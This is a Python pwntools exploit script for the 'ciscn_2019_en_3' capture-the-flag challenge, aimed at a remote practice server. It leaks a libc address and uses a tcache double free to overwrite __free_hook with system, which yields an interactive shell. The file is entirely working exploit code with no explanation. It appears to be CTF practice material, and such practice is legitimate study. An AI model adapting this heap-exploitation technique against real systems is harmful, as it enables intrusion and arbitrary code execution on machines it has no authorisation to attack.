# -*- coding: utf-8 -*-
from PwnContext.core import *
binary = './ciscn_2019_en_3'
debug_libc = './libc-2.27.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 1


if local == 1 :
    p = remote("node3.buuoj.cn","25900")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()


def add(size,story):
    p.sendlineafter('choice:','1')
    p.sendlineafter('story:',str(size))
    p.sendlineafter('story:',story)

def edit():
    p.sendlineafter('choice:','2')

def show():
    p.sendlineafter('choice:','3')

def delete(idx):
    p.sendlineafter('choice:','4')
    p.sendlineafter('index:',str(idx))

lg=lambda address,data:log.success('%s: '%(address)+hex(data))

def exp():
    p.sendlineafter('name?','aaaaaa')
    p.sendlineafter('ID.','2'*8)
    libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-231-libc.sym['setbuffer']  #带出_IO_setbuffer +0xE7
    lg('libcbase',libcbase)
    free_hook=libcbase+libc.sym['__free_hook']
    system=libcbase+libc.sym['system']
    add(0x20,'aaaa')#0
    add(0x20,'/bin/sh\x00')
    delete(0)
    delete(0)
    add(0x20,p64(free_hook))
    add(0x20,'dd')
    add(0x20,p64(system))
    delete(1)
    p.interactive()

if __name__=="__main__":
    exp()
